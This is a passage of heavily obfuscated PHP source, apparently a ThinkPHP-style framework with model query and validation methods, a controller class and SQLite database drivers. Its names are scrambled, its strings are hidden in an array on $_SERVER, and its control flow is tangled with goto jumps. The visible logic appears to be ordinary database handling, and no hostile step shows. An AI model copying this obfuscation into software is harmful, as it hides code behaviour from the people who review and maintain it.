strpos($F¥¹½ãËÜá[0], $bˆÙ«¶¼Ï›[47])) { $F¥¹½ãËÜá[0] = explode($bˆÙ«¶¼Ï›[47], $F¥¹½ãËÜá[0]); } $BÈ§¨ò¤É = array(); if (is_array($F¥¹½ãËÜá[0])) { foreach ($F¥¹½ãËÜá[0] as $Cô™Ã˜¢÷) { $BÈ§¨ò¤É[$Cô™Ã˜¢÷] = $aâò¤¸ŠË‹[$Cô™Ã˜¢÷]; } } else { $BÈ§¨ò¤É[$F¥¹½ãËÜá[0]] = $aâò¤¸ŠË‹[$F¥¹½ãËÜá[0]]; } if (!empty($aâò¤¸ŠË‹[$this->getPk()])) { $BÈ§¨ò¤É[$this->getPk()] = array($bˆÙ«¶¼Ï›[338], $aâò¤¸ŠË‹[$this->getPk()]); } if ($this->where($BÈ§¨ò¤É)->find()) { return !1; } return !0; default: return $this->check($aâò¤¸ŠË‹[$F¥¹½ãËÜá[0]], $F¥¹½ãËÜá[1], $F¥¹½ãËÜá[4]); } } public function check($F‹äõ‚šÏ, $BšÈÁé…·Î, $a¤Êó§¼“ = "\x72\145\x67\x65\x78") { $CÉš¿¤» =& $_SERVER[úÉ·öƒÑì©]; $a¤Êó§¼“ = strtolower(trim($a¤Êó§¼“)); switch ($a¤Êó§¼“) { case $CÉš¿¤»[7]: case $CÉš¿¤»[339]: $AĞ˜ĞœôÏ = is_array($BšÈÁé…·Î) ? $BšÈÁé…·Î : explode($CÉš¿¤»[47], $BšÈÁé…·Î); return $a¤Êó§¼“ == $CÉš¿¤»[7] ? in_array($F‹äõ‚šÏ, $AĞ˜ĞœôÏ) : !in_array($F‹äõ‚šÏ, $AĞ˜ĞœôÏ); case $CÉš¿¤»[340]: case $CÉš¿¤»[341]: if (is_array($BšÈÁé…·Î)) { $C“°´†šÇ = $BšÈÁé…·Î[0]; $a“ï’ŞŞÛ = $BšÈÁé…·Î[1]; } else { list($C“°´†šÇ, $a“ï’ŞŞÛ) = explode($CÉš¿¤»[47], $BšÈÁé…·Î); } return $a¤Êó§¼“ == $CÉš¿¤»[340] ? $F‹äõ‚šÏ >= $C“°´†šÇ && $F‹äõ‚šÏ <= $a“ï’ŞŞÛ : $F‹äõ‚šÏ < $C“°´†šÇ || $F‹äõ‚šÏ > $a“ï’ŞŞÛ; case $CÉš¿¤»[342]: case $CÉš¿¤»[343]: return $a¤Êó§¼“ == $CÉš¿¤»[342] ? $F‹äõ‚šÏ == $BšÈÁé…·Î : $F‹äõ‚šÏ != $BšÈÁé…·Î; case $CÉš¿¤»[344]: $FªÃª¸ÒÄ = mb_strlen($F‹äõ‚šÏ, $CÉš¿¤»[345]); if (strpos($BšÈÁé…·Î, $CÉš¿¤»[47])) { list($C“°´†šÇ, $a“ï’ŞŞÛ) = explode($CÉš¿¤»[47], $BšÈÁé…·Î); return $FªÃª¸ÒÄ >= $C“°´†šÇ && $FªÃª¸ÒÄ <= $a“ï’ŞŞÛ; } else { return $FªÃª¸ÒÄ == $BšÈÁé…·Î; } case $CÉš¿¤»[346]: list($bÔÙˆöªÃ, $a†ß‹ˆ¤Å°) = explode($CÉš¿¤»[47], $BšÈÁé…·Î); if (!is_numeric($bÔÙˆöªÃ)) { $bÔÙˆöªÃ = strtotime($bÔÙˆöªÃ); } if (!is_numeric($a†ß‹ˆ¤Å°)) { $a†ß‹ˆ¤Å° = strtotime($a†ß‹ˆ¤Å°); } return NOW_TIME >= $bÔÙˆöªÃ && NOW_TIME <= $a†ß‹ˆ¤Å°; case $CÉš¿¤»[347]: return in_array(get_client_ip(), explode($CÉš¿¤»[47], $BšÈÁé…·Î)); case $CÉš¿¤»[348]: return !in_array(get_client_ip(), explode($CÉš¿¤»[47], $BšÈÁé…·Î)); case $CÉš¿¤»[335]: default: return $this->regex($F‹äõ‚šÏ, $BšÈÁé…·Î); } } public function query($E®ù†æšƒ¾, $EÏ’¾ö¿ê± = false) { $c•¯óá ¾ =& $_SERVER[úÉ·öƒÑì©]; if (!is_bool($EÏ’¾ö¿ê±) && !is_array($EÏ’¾ö¿ê±)) { $EÏ’¾ö¿ê± = func_get_args(); array_shift($EÏ’¾ö¿ê±); } $E®ù†æšƒ¾ = str_replace(array($c•¯óá ¾[229], $c•¯óá ¾[349]), $c•¯óá ¾[50], $E®ù†æšƒ¾); $E®ù†æšƒ¾ = $this->parseSql($E®ù†æšƒ¾, $EÏ’¾ö¿ê±); return $this->db->query($E®ù†æšƒ¾); } public function execute($Dç©óéé, $CÆ‚Ş‹Ğ®¦ = false) { if (!is_bool($CÆ‚Ş‹Ğ®¦) && !is_array($CÆ‚Ş‹Ğ®¦)) { $CÆ‚Ş‹Ğ®¦ = func_get_args(); array_shift($CÆ‚Ş‹Ğ®¦); } $Dç©óéé = $this->parseSql($Dç©óéé, $CÆ‚Ş‹Ğ®¦); return $this->db->execute($Dç©óéé); } protected function parseSql($AİØÓƒãŸ„, $ağò¨Óñ¾) { $c…´…›çÇ’ =& $_SERVER[úÉ·öƒÑì©]; if (!0 === $ağò¨Óñ¾) { $eİÒš‹Öªİ = $this->_parseOptions(); $AİØÓƒãŸ„ = $this->db->parseSql($AİØÓƒãŸ„, $eİÒš‹Öªİ); } elseif (is_array($ağò¨Óñ¾)) { $ağò¨Óñ¾ = array_map(array($this->db, $c…´…›çÇ’[350]), $ağò¨Óñ¾); $AİØÓƒãŸ„ = vsprintf($AİØÓƒãŸ„, $ağò¨Óñ¾); } else { $AİØÓƒãŸ„ = strtr($AİØÓƒãŸ„, array($c…´…›çÇ’[351] => $this->getTableName(), $c…´…›çÇ’[352] => think_config($c…´…›çÇ’[251]))); } $this->db->setModel($this->name); return $AİØÓƒãŸ„; } public function db($eõíäÀ›ËÙ = '', $EİŒÖé½å = '', $bÛàÂáœì‰ = array()) { goto E„ŞØ‡¥¡; Eãà”ã÷É: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto fÇğ’áñ¡; CÏŒÍ´‰¿•: static $F£¯¾Ê§Ø© = array(); if (!isset($F£¯¾Ê§Ø©[$eõíäÀ›ËÙ]) || isset($F£¯¾Ê§Ø©[$eõíäÀ›ËÙ]) && $EİŒÖé½å && $BôÛ¹†¢‰º[$eõíäÀ›ËÙ] != $EİŒÖé½å) { if (!empty($EİŒÖé½å) && is_string($EİŒÖé½å) && !1 === strpos($EİŒÖé½å, $e†ë÷²§­õ[8])) { $EİŒÖé½å = think_config($EİŒÖé½å); } $F£¯¾Ê§Ø©[$eõíäÀ›ËÙ] = Db::getInstance($EİŒÖé½å); } elseif (NULL === $EİŒÖé½å) { $F£¯¾Ê§Ø©[$eõíäÀ›ËÙ]->close(); unset($F£¯¾Ê§Ø©[$eõíäÀ›ËÙ]); return; } if (!empty($bÛàÂáœì‰)) { if (is_string($bÛàÂáœì‰)) { parse_str($bÛàÂáœì‰, $bÛàÂáœì‰); } foreach ($bÛàÂáœì‰ as $A‰Ôø”¤ßÂ => $EÓŞÜæî¨) { $this->setProperty($A‰Ôø”¤ßÂ, $EÓŞÜæî¨); } } goto eš¨Èàğô; E„ŞØ‡¥¡: $e†ë÷²§­õ =& $_SERVER[úÉ·öƒÑì©]; if ($e†ë÷²§­õ[33] === $eõíäÀ›ËÙ && $this->db) { return $this->db; } static $BôÛ¹†¢‰º = array(); goto CÏŒÍ´‰¿•; eš¨Èàğô: $BôÛ¹†¢‰º[$eõíäÀ›ËÙ] = $EİŒÖé½å; $this->db = $F£¯¾Ê§Ø©[$eõíäÀ›ËÙ]; $this->_after_db(); goto Eãà”ã÷É; fÇğ’áñ¡: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $DÖ•ÑÄÕ—í = get_class($this); if ($DÖ•ÑÄÕ—í == $_SERVER[úÉ·öƒÑì©][353]) { return $this->name; } $this->name = substr($DÖ•ÑÄÕ—í, 0, -5); } return $this->name; } public function getTableName() { $Dºª±ôïÙ™ =& $_SERVER[úÉ·öƒÑì©]; if (empty($this->trueTableName)) { $A˜½£Û‹÷› = !empty($this->tablePrefix) ? $this->tablePrefix : $Dºª±ôïÙ™[33]; if (!empty($this->tableName)) { $A˜½£Û‹÷› .= $this->tableName; } else { $A˜½£Û‹÷› .= think_parse_name($this->name); } $this->trueTableName = strtolower($A˜½£Û‹÷›); } return (!empty($this->dbName) ? $this->dbName . $Dºª±ôïÙ™[95] : $Dºª±ôïÙ™[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Cù³º»ä¾ =& $_SERVER[úÉ·öƒÑì©]; return isset($this->fields[$Cù³º»ä¾[258]]) ? $this->fields[$Cù³º»ä¾[258]] : $this->pk; } public function getDbFields() { $BÒàƒŸ¹÷Œ =& $_SERVER[úÉ·öƒÑì©]; if (isset($this->options[$BÒàƒŸ¹÷Œ[286]])) { $Aµè¸ÈÙˆ¨ = $this->db->getFields($this->options[$BÒàƒŸ¹÷Œ[286]]); return $Aµè¸ÈÙˆ¨ ? array_keys($Aµè¸ÈÙˆ¨) : !1; } if ($this->fields) { $Aµè¸ÈÙˆ¨ = $this->fields; unset($Aµè¸ÈÙˆ¨[$BÒàƒŸ¹÷Œ[257]], $Aµè¸ÈÙˆ¨[$BÒàƒŸ¹÷Œ[258]], $Aµè¸ÈÙˆ¨[$BÒàƒŸ¹÷Œ[259]], $Aµè¸ÈÙˆ¨[$BÒàƒŸ¹÷Œ[256]]); return $Aµè¸ÈÙˆ¨; } return !1; } public function data($A¥¹ÚãÖÙ¸ = '') { $dïÛ•¤ò½Š =& $_SERVER[úÉ·öƒÑì©]; if ($dïÛ•¤ò½Š[33] === $A¥¹ÚãÖÙ¸ && !empty($this->data)) { return $this->data; } if (is_object($A¥¹ÚãÖÙ¸)) { $A¥¹ÚãÖÙ¸ = get_object_vars($A¥¹ÚãÖÙ¸); } elseif (is_string($A¥¹ÚãÖÙ¸)) { parse_str($A¥¹ÚãÖÙ¸, $A¥¹ÚãÖÙ¸); } elseif (!is_array($A¥¹ÚãÖÙ¸)) { think_exception(think_lang($dïÛ•¤ò½Š[278])); } $this->data = $A¥¹ÚãÖÙ¸; return $this; } public function join($D°õÛ¾­µ) { $B¶áè´‰•ò =& $_SERVER[úÉ·öƒÑì©]; if (is_array($D°õÛ¾­µ)) { $this->options[$B¶áè´‰•ò[289]] = $D°õÛ¾­µ; } elseif (!empty($D°õÛ¾­µ)) { $this->options[$B¶áè´‰•ò[289]][] = $D°õÛ¾­µ; } return $this; } public function union($Bƒ¨ŠËäàç, $fÃŠÊ§œ÷õ = false) { goto f†Çº‡İç¼; f†Çº‡İç¼: $B¤­‚á·Êù =& $_SERVER[úÉ·öƒÑì©]; if (empty($Bƒ¨ŠËäàç)) { return $this; } if ($fÃŠÊ§œ÷õ) { $this->options[$B¤­‚á·Êù[354]][$B¤­‚á·Êù[355]] = !0; } goto c÷œÒÎ„©‡; b÷É„ÂïÆê: return $this; goto f±ô‚éÏ¶­; c÷œÒÎ„©‡: if (is_object($Bƒ¨ŠËäàç)) { $Bƒ¨ŠËäàç = get_object_vars($Bƒ¨ŠËäàç); } if (is_string($Bƒ¨ŠËäàç)) { $A‡á’ãàõç = $Bƒ¨ŠËäàç; } elseif (is_array($Bƒ¨ŠËäàç)) { if (isset($Bƒ¨ŠËäàç[0])) { $this->options[$B¤­‚á·Êù[354]] = array_merge($this->options[$B¤­‚á·Êù[354]], $Bƒ¨ŠËäàç); return $this; } else { $A‡á’ãàõç = $Bƒ¨ŠËäàç; } } else { think_exception(think_lang($B¤­‚á·Êù[278])); } $this->options[$B¤­‚á·Êù[354]][] = $A‡á’ãàõç; goto b÷É„ÂïÆê; f±ô‚éÏ¶­: } public function cache($CŸÆËìƒ¦© = true, $BÌõÙ‹ÚÖô = null, $b‡¿«–¬°ß = '') { $d†Ä×ÖóåŠ =& $_SERVER[úÉ·öƒÑì©]; if (!1 !== $CŸÆËìƒ¦©) { $this->options[$d†Ä×ÖóåŠ[356]] = array($d†Ä×ÖóåŠ[93] => $CŸÆËìƒ¦©, $d†Ä×ÖóåŠ[346] => $BÌõÙ‹ÚÖô, $d†Ä×ÖóåŠ[29] => $b‡¿«–¬°ß); } return $this; } public function field($E¦‡¹–Œ, $c©ªá¤…„ = false) { $C³à¥Ìç =& $_SERVER[úÉ·öƒÑì©]; if (!0 === $E¦‡¹–Œ) { $EÏõªÓ„Æ¥ = $this->getDbFields(); $E¦‡¹–Œ = $EÏõªÓ„Æ¥ ? $EÏõªÓ„Æ¥ : $C³à¥Ìç[182]; } elseif ($c©ªá¤…„) { if (is_string($E¦‡¹–Œ)) { $E¦‡¹–Œ = explode($C³à¥Ìç[47], $E¦‡¹–Œ); } $EÏõªÓ„Æ¥ = $this->getDbFields(); $E¦‡¹–Œ = $EÏõªÓ„Æ¥ ? array_diff($EÏõªÓ„Æ¥, $E¦‡¹–Œ) : $E¦‡¹–Œ; } $this->options[$C³à¥Ìç[280]] = $E¦‡¹–Œ; return $this; } public function scope($F¥†—ƒ”…‰ = '', $c¸Œ²§»Ûò = NULL) { $a‡Î©á¸Á =& $_SERVER[úÉ·öƒÑì©]; if ($a‡Î©á¸Á[33] === $F¥†—ƒ”…‰) { if (isset($this->_scope[$a‡Î©á¸Á[34]])) { $F±·×ã©µ¤ = $this->_scope[$a‡Î©á¸Á[34]]; } else { return $this; } } elseif (is_string($F¥†—ƒ”…‰)) { $CºÇ³Õ¡˜ò = explode($a‡Î©á¸Á[47], $F¥†—ƒ”…‰); $F±·×ã©µ¤ = array(); foreach ($CºÇ³Õ¡˜ò as $f²ãŸ¹Ø°¬) { if (!isset($this->_scope[$f²ãŸ¹Ø°¬])) { continue; } $F±·×ã©µ¤ = array_merge($F±·×ã©µ¤, $this->_scope[$f²ãŸ¹Ø°¬]); } if (!empty($c¸Œ²§»Ûò) && is_array($c¸Œ²§»Ûò)) { $F±·×ã©µ¤ = array_merge($F±·×ã©µ¤, $c¸Œ²§»Ûò); } } elseif (is_array($F¥†—ƒ”…‰)) { $F±·×ã©µ¤ = $F¥†—ƒ”…‰; } if (is_array($F±·×ã©µ¤) && !empty($F±·×ã©µ¤)) { $this->options = array_merge($this->options, array_change_key_case($F±·×ã©µ¤)); } return $this; } public function where($bÈ ëÅÒ„š, $BÔøÂí™´Á = null) { $Eó”È…à‹¿ =& $_SERVER[úÉ·öƒÑì©]; if (!is_null($BÔøÂí™´Á) && is_string($bÈ ëÅÒ„š)) { if (!is_array($BÔøÂí™´Á)) { $BÔøÂí™´Á = func_get_args(); array_shift($BÔøÂí™´Á); } $BÔøÂí™´Á = array_map(array($this->db, $Eó”È…à‹¿[350]), $BÔøÂí™´Á); $bÈ ëÅÒ„š = vsprintf($bÈ ëÅÒ„š, $BÔøÂí™´Á); } elseif (is_object($bÈ ëÅÒ„š)) { $bÈ ëÅÒ„š = get_object_vars($bÈ ëÅÒ„š); } elseif (is_array($bÈ ëÅÒ„š)) { foreach ($bÈ ëÅÒ„š as $A‹ƒŠé§‹ => $dõªÏÃÑº) { if ((is_numeric($A‹ƒŠé§‹) || !$A‹ƒŠé§‹) && is_string($dõªÏÃÑº)) { if (strpos($dõªÏÃÑº, $Eó”È…à‹¿[357]) === 0) { continue; } think_trace($Eó”È…à‹¿[358], $Eó”È…à‹¿[33], $Eó”È…à‹¿[46]); die; } } } if (is_string($bÈ ëÅÒ„š) && $Eó”È…à‹¿[33] != $bÈ ëÅÒ„š) { $d‘å¯ğŸ¦ = array(); $d‘å¯ğŸ¦[$Eó”È…à‹¿[359]] = $bÈ ëÅÒ„š; $bÈ ëÅÒ„š = $d‘å¯ğŸ¦; } if (isset($this->options[$Eó”È…à‹¿[282]])) { $this->options[$Eó”È…à‹¿[282]] = array_merge($this->options[$Eó”È…à‹¿[282]], $bÈ ëÅÒ„š); } else { $this->options[$Eó”È…à‹¿[282]] = $bÈ ëÅÒ„š; } return $this; } public function limit($DÁ˜á¢®’Ä, $d‹ïŠ’Ú£½ = null) { $a—…ŠÈŠ½Æ =& $_SERVER[úÉ·öƒÑì©]; $this->options[$a—…ŠÈŠ½Æ[299]] = is_null($d‹ïŠ’Ú£½) ? $DÁ˜á¢®’Ä : $DÁ˜á¢®’Ä . $a—…ŠÈŠ½Æ[47] . $d‹ïŠ’Ú£½; return $this; } public function page($B÷Ñä§ˆ·å, $aµó ô— = null) { $AËÕ‹¡£Îœ =& $_SERVER[úÉ·öƒÑì©]; $this->options[$AËÕ‹¡£Îœ[360]] = is_null($aµó ô—) ? $B÷Ñä§ˆ·å : $B÷Ñä§ˆ·å . $AËÕ‹¡£Îœ[47] . $aµó ô—; return $this; } public function comment($FİØ¸Àà´Í) { $this->options[$_SERVER[úÉ·öƒÑì©][361]] = $FİØ¸Àà´Í; return $this; } public function setProperty($dÚÊÊ¡µ, $A’ÑĞöİ) { if (property_exists($this, $dÚÊÊ¡µ)) { $this->{$dÚÊÊ¡µ} = $A’ÑĞöİ; } return $this; } } goto e¡ßò‚ÀÔğ; e‡òí¹ÎÂ•: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto EÂ‘‚‹†÷ò; aŠö°èƒÔñ: $this->in =& $in; $this->values[$dÖ†²ïªˆµ[6]] =& $config; $this->values[$dÖ†²ïªˆµ[7]] =& $in; goto E¬¸öÂ©À; EÂ‘‚‹†÷ò: $dÖ†²ïªˆµ =& $_SERVER[úÉ·öƒÑì©]; global $in, $config; $this->config =& $config; goto aŠö°èƒÔñ; E¬¸öÂ©À: $this->tpl = TEMPLATE . MOD . $dÖ†²ïªˆµ[8]; $this->_classObjectID = mt_rand(0, 10000); goto cóĞÒ¸‡¸; cóĞÒ¸‡¸: } public function loadClass($D–ôˆèÖãì) { if (1 === func_num_args()) { $this->{$D–ôˆèÖãì} = new $D–ôˆèÖãì(); } else { $F±™„éÚ’– = new ReflectionClass($D–ôˆèÖãì); $eòğèÁ·è = func_get_args(); array_shift($eòğèÁ·è); $this->{$D–ôˆèÖãì} = $F±™„éÚ’–->newInstanceArgs($eòğèÁ·è); } return $this->{$D–ôˆèÖãì}; } protected function assign($eÙá”³Ìİ, $FÖåõæÍŠç) { $this->values[$eÙá”³Ìİ] = $FÖåõæÍŠç; } protected function display($fÈ«ÖŠ†Á) { ob_end_clean(); extract($this->values); require $this->tpl . $fÈ«ÖŠ†Á; } } class DbSqliteBase extends Db { public function __construct($cõ¦ˆÙÚ›À = '') { $eø“ŞŠ¾™“ =& $_SERVER[úÉ·öƒÑì©]; if (!extension_loaded($eø“ŞŠ¾™“[9])) { think_exception(think_lang($eø“ŞŠ¾™“[10]) . $eø“ŞŠ¾™“[11]); } if (!empty($cõ¦ˆÙÚ›À)) { if (!isset($cõ¦ˆÙÚ›À[$eø“ŞŠ¾™“[12]])) { $cõ¦ˆÙÚ›À[$eø“ŞŠ¾™“[12]] = 438; } $this->config = $cõ¦ˆÙÚ›À; if (empty($this->config[$eø“ŞŠ¾™“[13]])) { $this->config[$eø“ŞŠ¾™“[13]] = array(); } } } public function connect($aºŠ°®Ú¾º = '', $b¾»õò•”¿ = 0) { $Eº„´ºÍñà =& $_SERVER[úÉ·öƒÑì©]; if (!isset($this->linkID[$b¾»õò•”¿])) { goto cñºÃ×¸’¸; C÷í¡¥Ò²ğ: @sqlite_busy_timeout($this->linkID[$b¾»õò•”¿], 30000); if (1 != think_config($Eº„´ºÍñà[18])) { unset($this->config); } goto f‘ÇàÈ¬¨Ü; cñºÃ×¸’¸: if (empty($aºŠ°®Ú¾º)) { $aºŠ°®Ú¾º = $this->config; } $EŸ›–ÃÚ = !empty($aºŠ°®Ú¾º[$Eº„´ºÍñà[13]][$Eº„´ºÍñà[14]]) ? $aºŠ°®Ú¾º[$Eº„´ºÍñà[13]][$Eº„´ºÍñà[14]] : $this->pconnect; $cë”Û¯åœî = $EŸ›–ÃÚ ? $Eº„´ºÍñà[15] : $Eº„´ºÍñà[16]; goto dÄÌ Èãùé; dÄÌ Èãùé: $this->linkID[$b¾»õò•”¿] = $cë”Û¯åœî($aºŠ°®Ú¾º[$Eº„´ºÍñà[17]], $aºŠ°®Ú¾º[$Eº„´ºÍñà[12]]); if (!$this->linkID[$b¾»õò•”¿]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto C÷í¡¥Ò²ğ; f‘ÇàÈ¬¨Ü: } return $this->linkID[$b¾»õò•”¿]; } public function free() { $this->queryID = null; } public function query($eÔÃ·¯¼ ›) { goto eÚğ½—×ø; eÚğ½—×ø: $FÄÌÉ™öÁ =& $_SERVER[úÉ·öƒÑì©]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto BÓ‚”Ü“Û£; aï——¼œ¡: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $c†„×†ÂĞ = $this->getAll(); return $c†„×†ÂĞ; } goto dÄïµçÑËí; BÓ‚”Ü“Û£: $this->queryStr = $eÔÃ·¯¼ ›; if ($this->queryID) { $this->free(); } think_action_status($FÄÌÉ™öÁ[19], 1); goto bßËçåíâœ; bßËçåíâœ: think_status($FÄÌÉ™öÁ[20]); $this->queryID = sqlite_query($this->_linkID, $eÔÃ·¯¼ ›); $this->debug(); goto aï——¼œ¡; dÄïµçÑËí: } public function execute($c…ĞÎÀ÷í) { goto BŠÍ·øäğ; eÓ§Í¢ÀÎ: if (!1 === $e˜¹‘‡ë„Ó) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto f¡·ŠÁ‰§¾; b…½¡Ç”™¿: think_status($aªïÑÓÊ´Š[20]); $e˜¹‘‡ë„Ó = sqlite_exec($this->_linkID, $c…ĞÎÀ÷í); $this->debug(); goto eÓ§Í¢ÀÎ; a¬„³ë»ÃÄ: $this->queryStr = $c…ĞÎÀ÷í; if ($this->queryID) { $this->free(); } think_action_status($aªïÑÓÊ´Š[21], 1); goto b…½¡Ç”™¿; BŠÍ·øäğ: $aªïÑÓÊ´Š =& $_SERVER[úÉ·öƒÑì©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a¬„³ë»ÃÄ; f¡·ŠÁ‰§¾: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[úÉ·öƒÑì©][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F¡¢Á¦‰  = sqlite_query($this->_linkID, $_SERVER[úÉ·öƒÑì©][23]); if (!$F¡¢Á¦‰ ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fƒÀõ·™³ = sqlite_query($this->_linkID, $_SERVER[úÉ·öƒÑì©][24]); if (!$fƒÀõ·™³) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Fö¡œ·­© = array(); if ($this->numRows > 0) { for ($dÂÜÓÇ–’´ = 0; $dÂÜÓÇ–’´ < $this->numRows; $dÂÜÓÇ–’´++) { $Fö¡œ·­©[$dÂÜÓÇ–’´] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Fö¡œ·­©; } public function getFields($bº„ß‘Øæ¯) { $fØ•¤“œ‚ö =& $_SERVER[úÉ·öƒÑì©]; $AÛ×ÈˆÀ… = $this->query($fØ•¤“œ‚ö[25] . $bº„ß‘Øæ¯ . $fØ•¤“œ‚ö[26]); $FØëµšËÃ” = array(); if ($AÛ×ÈˆÀ…) { foreach ($AÛ×ÈˆÀ… as $Aï‹ÒÚˆÀ => $B×’ò®â³Ö) { $FØëµšËÃ”[$B×’ò®â³Ö[$fØ•¤“œ‚ö[27]]] = array($fØ•¤“œ‚ö[28] => $B×’ò®â³Ö[$fØ•¤“œ‚ö[27]], $fØ•¤“œ‚ö[29] => $B×’ò®â³Ö[$fØ•¤“œ‚ö[30]], $fØ•¤“œ‚ö[31] => (bool) ($B×’ò®â³Ö[$fØ•¤“œ‚ö[32]] === $fØ•¤“œ‚ö[33]), $fØ•¤“œ‚ö[34] => $B×’ò®â³Ö[$fØ•¤“œ‚ö[35]], $fØ•¤“œ‚ö[36] => strtolower($B×’ò®â³Ö[$fØ•¤“œ‚ö[37]]) == $fØ•¤“œ‚ö[38], $fØ•¤“œ‚ö[39] => strtolower($B×’ò®â³Ö[$fØ•¤“œ‚ö[40]]) == $fØ•¤“œ‚ö[41]); } } return $FØëµšËÃ”; } public function getTables($A—Á½ÏóÁ = '') { $A¶×ÊÖäè =& $_SERVER[úÉ·öƒÑì©]; $a¹ôğğ¬ì = $this->query($A¶×ÊÖäè[42] . $A¶×ÊÖäè[43] . $A¶×ÊÖäè[44]); $F»Éù•‘³ê = array(); foreach ($a¹ôğğ¬ì as $BÇ¡ƒÍèÍ¿ => $AÃëêé§‹–) { $F»Éù•‘³ê[$BÇ¡ƒÍèÍ¿] = current($AÃëêé§‹–); } return $F»Éù•‘³ê; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $CÍ·ÚÎÍŒ =& $_SERVER[úÉ·öƒÑì©]; $fÉÂÛŸÅô’ = sqlite_last_error($this->_linkID); $this->error = $fÉÂÛŸÅô’ . $CÍ·ÚÎÍŒ[4] . sqlite_error_string($fÉÂÛŸÅô’); if ($CÍ·ÚÎÍŒ[33] != $this->queryStr) { $this->error .= LNG($CÍ·ÚÎÍŒ[45]) . $this->queryStr; } think_trace($this->error, $CÍ·ÚÎÍŒ[33], $CÍ·ÚÎÍŒ[46]); return $this->error; } public function escapeString($dÀé©ìÌ´‚) { return sqlite_escape_string($dÀé©ìÌ´‚); } public function parseLimit($c†î…ìĞôÚ) { $C´‘ÄÛÄÊ =& $_SERVER[úÉ·öƒÑì©]; $d‡™Áî‘ = $C´‘ÄÛÄÊ[33]; if (!empty($c†î…ìĞôÚ)) { $c†î…ìĞôÚ = explode($C´‘ÄÛÄÊ[47], $c†î…ìĞôÚ); if (count($c†î…ìĞôÚ) > 1) { $d‡™Áî‘ .= $C´‘ÄÛÄÊ[48] . $c†î…ìĞôÚ[1] . $C´‘ÄÛÄÊ[49] . $c†î…ìĞôÚ[0] . $C´‘ÄÛÄÊ[50]; } else { $d‡™Áî‘ .= $C´‘ÄÛÄÊ[48] . $c†î…ìĞôÚ[0] . $C´‘ÄÛÄÊ[50]; } } return $d‡™Áî‘; } } class DbSqlite3Base extends Db { public function __construct($A»ÃŒƒ’­ = '') { $B‰Ú–³×„‰ =& $_SERVER[úÉ·öƒÑì©]; if (!class_exists($B‰Ú–³×„‰[51])) { think_exception(think_lang($B‰Ú–³×„‰[10]) . $B‰Ú–³×„‰[52]); } if (!empty($A»ÃŒƒ’­)) { if (!isset($A»ÃŒƒ’­[$B‰Ú–³×„‰[12]])) { $A»ÃŒƒ’­[$B‰Ú–³×„‰[12]] = 438; } $this->config = $A»ÃŒƒ’­; if (empty($this->config[$B‰Ú–³×„‰[13]])) { $this->config[$B‰Ú–³×„‰[13]] = array(); } } } public function connect($aê‹ŞÛÕœ” = '', $EÅà¨•š´• = 0) { $DÜß¼ÎÎù =& $_SERVER[úÉ·öƒÑì©]; if (!isset($this->linkID[$EÅà¨•š´•])) { if (empty($aê‹ŞÛÕœ”)) { $aê‹ŞÛÕœ” = $this->config; } $this->linkID[$EÅà¨•š´•] = new SQLite3($aê‹ŞÛÕœ”[$DÜß¼ÎÎù[17]]); if (!$this->linkID[$EÅà¨•š´•]) { think_exception($this->linkID[$EÅà¨•š´•]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$EÅà¨•š´•]->busyTimeout(30000); if (1 != think_config($DÜß¼ÎÎù[18])) { unset($this->config); } } return $this->linkID[$EÅà¨•š´•]; } public function free() { $this->queryID = null; } public function query($cˆá¼¢çˆ) { goto dñÆ—ñ†–º; FïˆÜƒ¦î‰: think_status($a‚Ô‰ñ±«¢[20]); $this->queryID = $this->_linkID->query($cˆá¼¢çˆ); $this->debug(); goto d˜ƒ·Œºã; dñÆ—ñ†–º: $a‚Ô‰ñ±«¢ =& $_SERVER[úÉ·öƒÑì©]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C¤ÄŞ„†Ïğ; d˜ƒ·Œºã: if (!1 === $this->queryID) { $this->error(); return !1; } else { $e¬Ä¨Ñ“‘ = $this->getAll(); $this->numRows = count($e¬Ä¨Ñ“‘); return $e¬Ä¨Ñ“‘; } goto C¿ŒÃˆ•; C¤ÄŞ„†Ïğ: $this->queryStr = $cˆá¼¢çˆ; if ($this->queryID) { $this->free(); } think_action_status($a‚Ô‰ñ±«¢[19], 1); goto FïˆÜƒ¦î‰; C¿ŒÃˆ•: } public function execute($E¡È–ŒÉçÚ) { goto A„Æ“ç¹Ó; BáêáÌ¥Ğ: think_status($aßä‚ç ÈÔ[20]); $B‹Ï·ÙÕ¢Ğ = $this->_linkID->exec($E¡È–ŒÉçÚ); $this->debug(); goto f¤‹ÛÓ£ßÔ; f¤‹ÛÓ£ßÔ: if (!1 === $B‹Ï·ÙÕ¢Ğ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto bÒ ²“ŒÀ; A„Æ“ç¹Ó: $aßä‚ç ÈÔ =& $_SERVER[úÉ·öƒÑì©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aÅÖ–‘ÙŞ—; 